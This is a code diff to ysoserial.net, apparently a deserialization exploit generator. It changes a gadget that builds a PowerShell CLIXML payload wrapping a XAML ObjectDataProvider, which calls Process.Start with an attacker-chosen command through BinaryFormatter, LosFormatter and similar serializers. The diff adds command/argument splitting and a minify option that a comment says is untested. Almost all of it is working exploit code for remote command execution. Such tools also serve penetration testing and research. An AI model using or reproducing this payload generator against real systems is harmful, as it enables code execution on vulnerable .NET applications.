@@ -48,8 +48,23 @@ namespace ysoserial.Generators
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test)
+        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
         {
+            Boolean hasArgs;
+            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+
+            String cmdPart;
+
+            if (hasArgs)
+            {
+                cmdPart = $@"&lt;System:String&gt;"+ splittedCMD[0] + @"&lt;/System:String&gt;
+        &lt;System:String&gt;""" + splittedCMD[1] + @""" &lt;/System:String&gt;";
+            }
+            else
+            {
+                cmdPart = $@"&lt;System:String&gt;" + splittedCMD[0] + @"&lt;/System:String&gt;";
+            }
+
             string clixml = @"
 <Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04"">&#xD;
 <Obj RefId=""0"">&#xD;
@@ -80,8 +95,7 @@ namespace ysoserial.Generators
   xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system""&gt;
 	 &lt;ObjectDataProvider x:Key=""LaunchCalc"" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" &gt;
      &lt;ObjectDataProvider.MethodParameters&gt;
-        &lt;System:String&gt;cmd&lt;/System:String&gt;
-        &lt;System:String&gt;/c """ + cmd + @""" &lt;/System:String&gt;
+        "+ cmdPart + @"
      &lt;/ObjectDataProvider.MethodParameters&gt;
     &lt;/ObjectDataProvider&gt;
 &lt;/ResourceDictionary&gt;
@@ -114,8 +128,16 @@ namespace ysoserial.Generators
     </MS>&#xD;
   </Obj>&#xD;
 </Objs>";
+
+            if (minify)
+            {
+                // Could not be tested so it may not work here!
+                // also not sure if can use CDATA otherwise we could use the CDATA flag to save more space
+                clixml = Helpers.XMLMinifier.Minify(clixml, null, null);
+            }
+
             PsObjectMarshal payload = new PsObjectMarshal(clixml);
-            return Serialize(payload, formatter, test);
+            return Serialize(payload, formatter, test, minify);
         }
 
     }
